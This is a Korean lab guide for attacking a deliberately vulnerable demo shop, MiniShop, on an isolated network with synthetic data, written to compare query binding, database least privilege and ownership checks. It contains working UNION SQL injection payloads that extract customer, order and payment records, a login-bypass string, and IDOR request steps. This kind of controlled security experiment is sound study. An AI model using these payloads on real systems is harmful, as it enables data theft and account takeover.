# 공격 가이드 · MiniShop 단계별 실습

이 문서는 팀이 만든 **격리된 Host-only 실습환경**에서 합성 데이터만을 대상으로 공격을 재현하는 절차다.
실데이터·외부 서비스·공개 사이트를 대상으로 하지 않는다.

실험은 두 묶음이다.

| 묶음 | 조건 | 무엇을 보이나 |
|---|---|---|
| 메인 (검색 SQLi × DB 권한) | E1 · E2 · E3 · E4 | 쿼리 바인딩과 DB 최소 권한이 **각각** 유출에 주는 효과 |
| 보조 (원래 4조 기획) | A(로그인 SQLi) · C2(IDOR) | 인증 우회와, 바인딩과 무관한 **객체 인가 결함** |

> 주문 조회 SQLi(C1)는 주문 API가 정수 경로(`/orders/<int>`)여서 별도 주입점이 없다.
> 주문 데이터 노출은 검색 SQLi(B, `P_ORDER`)와 IDOR(C2)로 대신 보인다.

## 0. 공통 준비

Ubuntu에서 서버를 띄우고(조건별 명령은 각 절), Kali(또는 Windows)의 Burp 내장 브라우저로 접속한다.

```sh
# Kali 터미널. 결과 폴더는 Kali 로컬 전용.
umask 077
LAB_BASE='http://192.168.67.20:18080'          # 실제 Ubuntu Host-only 주소로
LAB_RUN="$HOME/minishop-results/$(date -u +%Y%m%dT%H%M%SZ)"; mkdir -p "$LAB_RUN"
curl -sS "$LAB_BASE/health/catalog"; echo
curl -sS "$LAB_BASE/health/orders";  echo
```

`/health`로 **지금 실제로 어떤 조건이 돌고 있는지** 먼저 확인한다(환경변수 이름만 믿지 않는다).

| 조건 | health/catalog | health/orders |
|---|---|---|
| E1 | `database_role=catalog_reader_wide`, `query_mode=interpolated` | 안전 |
| E2 | `catalog_reader_wide`, `bound` | 안전 |
| E3 | `catalog_reader`, `interpolated` | 안전 |
| E4 | `catalog_reader`, `bound` | `ownership_enforced=true`, `login_sql_mode=bound` |
| A  | `catalog_reader`, `bound` | `login_sql_mode=interpolated` |
| C2 | `catalog_reader`, `bound` | `ownership_enforced=false` |

데이터 분모: 공개 상품 12 / 비공개 1, 합성 고객 100, 주문 300, 결제 메타 300.
user1 주문 1001~1003, user2 주문 2001~2003. 검색 응답은 최대 100행.

---

## B. 검색 SQL Injection (메인 실험 E1~E4)

검색 API는 `id, name, description, price` **4열**을 돌려준다. 그래서 UNION 입력도 4열로 맞춘다.
검색어 길이 제한은 100자다. 네 조건에 **완전히 같은 입력**을 보내고, 바뀌는 것은 서버 설정뿐이다.

### B-1. 구조 변조 가능 여부(프로브)

```sh
P_PROBE="x%' UNION ALL SELECT 900001,'LAB-SQLI-PROBE','probe',0 -- "
curl -sS --get -H 'Accept: application/json' --data-urlencode "q=$P_PROBE" \
  -D "$LAB_RUN/probe.h" -o "$LAB_RUN/probe.json" \
  -w 'status=%{http_code}\n' "$LAB_BASE/products"; cat "$LAB_RUN/probe.json"; echo
```

- E1/E3(interpolated): 결과에 `id=900001, name=LAB-SQLI-PROBE`가 섞여 **구조 변조 성공**.
- E2/E4(bound): 입력 전체가 검색어로 처리돼 `products: []`.

프로브는 공개 데이터만 쓰므로 **유출 성공으로 세지 않는다**(준비 확인용).

### B-2. 고객·주문·결제 노출

```sh
P_CUSTOMER="x%' UNION ALL SELECT id,email,name,0 FROM private.customers -- "
P_ORDER="x%' UNION ALL SELECT id,customer_id::text,total_amount::text,0 FROM private.orders -- "
P_PAYMENT="x%' UNION ALL SELECT id,order_id::text,method,0 FROM private.payment_meta -- "
for name in CUSTOMER ORDER PAYMENT; do
  eval "P=\$P_$name"
  curl -sS --get -H 'Accept: application/json' --data-urlencode "q=$P" \
    -D "$LAB_RUN/$name.h" -o "$LAB_RUN/$name.json" \
    -w "$name status=%{http_code}\n" "$LAB_BASE/products"
done
```

응답 JSON의 `products[].id/name/description`을 다음으로 해석한다.

| 입력 | id | name | description | 피해로 집계 |
|---|---|---|---|---|
| P_CUSTOMER | customers.id | 합성 이메일 | 고객명 | 고유 customer_id, 노출 필드 email/name |
| P_ORDER | orders.id | customer_id | 금액 | 고유 주문·고객 ID |
| P_PAYMENT | payment_meta.id | order_id | 결제수단 | 고유 결제 메타·주문 ID |

### B-3. 조건별 기대 관측과 판정

| 조건 | 설정 | 기대 관측 | 판정 |
|---|---|---|---|
| **E1** 기준선 | interpolated · wide | `customerNNN@example.invalid`와 고객 ID가 응답에 노출 | 공격 성공(방어 실패). 고유 고객 수 기록 |
| **E2** 바인딩 | bound · wide | `products: []`, 마커·고객 없음 | 웹 레벨 방어(D1). 노출 0 |
| **E3** 최소권한 | interpolated · reader | HTTP **503**, 서버 로그에 `SQLSTATE 42501 permission denied for schema private` | DB 레벨 방어(D2). SQLi는 남았지만 피해 차단. 노출 0 |
| **E4** 이중 | bound · reader | `products: []`, 오류 없음 | 이중 방어. 노출 0 |

> E3에서 노출이 0인 이유가 "입력이 잘못돼서"가 아니라 "권한 거부" 때문임을 **서버 로그로** 입증해야 한다.
> `sudo docker compose logs --tail 100 catalog-service`에서 같은 `X-Request-ID`의 `42501`을 확인한다.
> 참고: 이 환경은 다중 문장(`;`로 이어붙인 `DROP TABLE` 등)을 실행하지 않으며, 설령 전달돼도 reader 권한이 없어 거부된다.

### B-4. 반복·고정

입력 3종 × 10회 × 4조건 = 120 시퀀스. 동시성 1, 요청 간 1초.
각 응답의 `X-Request-ID`를 기록 ID와 연결한다(§결과 기록). 같은 100행을 10번 받아도 고유 노출량은 100이다.

---

## A. 로그인 SQL Injection

서버 구동: `bash scripts/setup-ubuntu.sh --experiment A`  (확인: `health/orders`의 `login_sql_mode=interpolated`)

Burp Repeater에서 `POST /login`(JSON)을 보낸다. 로그인 쿠키 없이 시작한다.

```
POST /login  (Content-Type: application/json, Origin 없음 또는 동일 출처)
{"username":"' OR '1'='1' -- ","password":"anything"}
```

- 기대: **200**, 응답에 `user`(user1)와 `csrf_token`, `Set-Cookie: minishop_session=...`.
- 비밀번호를 모른 채 세션이 생겼는지 확인: 받은 쿠키로 `GET /session`과 `GET /orders` 호출 → 200이면 인증 우회 성립.
- 특정 계정 지정: `{"username":"' OR username='user2' -- ", ...}` → user2 세션.

판정: **SQL 조회 성공이나 로그인 HTML 200만으로 우회라 하지 않는다.** 해시 검증 없이 발급된 세션으로
보호 API에 접근돼야 성공이다. 방어(E4/기본값, `login_sql_mode=bound`)에서 같은 입력은 **401**이어야 한다.

---

## C2. IDOR 객체 수준 인가 누락

서버 구동: `bash scripts/setup-ubuntu.sh --experiment C2`  (확인: `health/orders`의 `ownership_enforced=false`)

정상 로그인(바인딩 로그인은 그대로 동작)한 **user1 세션으로** 숫자 주문 ID만 바꿔 호출한다.
웹 계정 비밀번호는 Ubuntu에서 `python3 scripts/demo_credentials.py`로 확인한다.

| 호출(user1 세션, `Accept: application/json`) | C2(off) 기대 | E4/기본값(on) 기대 |
|---|---|---|
| `GET /orders` | 전체 300건(타인 주문 포함) | 본인 3건만 |
| `GET /orders/2002` (user2 주문) | **200**, user2 주문 본문 | **404** |
| `GET /orders/1001` (본인) | 200 | 200 |

판정: 소유자 검사 off에서 **타인 주문 본문이 반환**되면 성립. 이 노출은 SQL이 모두 바인딩된 상태에서
발생하므로 **SQLi가 아니라 인가 설계 결함**(CWE-639/862)이다. 쿼리 바인딩(D1)과 객체 수준 인가(D3)가 서로 다른 통제임을 보여주는 지점이다.
`/orders/1 OR 1=1` 같은 입력은 정수 라우팅에서 거부되므로 IDOR 증거가 아니다.

---

## 결과 기록 양식 (`test_results.csv`)

| 필드 | 설명 |
|---|---|
| Sequence_ID | 실험 일련번호 |
| Experiment_Condition | E1 / E2 / E3 / E4 / A / C2 |
| Input_ID | 입력 식별자(P_CUSTOMER, A-login, C2-2002 등) |
| X_Request_ID | 응답 헤더의 요청 ID(서버 로그 대조용) |
| HTTP_Status | 200 / 401 / 404 / 503 |
| Exposed_Customer_Count | 유출 고유 customer_id 수(E1은 1 이상, 방어조건은 0) |
| DB_Error_Code | E3에서 관측한 SQLSTATE(42501) |
| Normal_Function_OK | 정상 검색·로그인·본인 주문 유지 여부 |

증거는 HTTP 응답과 **같은 X-Request-ID의 서버 로그**, 코드·DB 권한을 함께 남긴다.
공유 자료에서는 비밀번호·Cookie·토큰을 제거한다.

관련: [방어 가이드](defense_guide.md) · [결과표/제출물](experiment_plan.md) · [아키텍처](architecture.md)
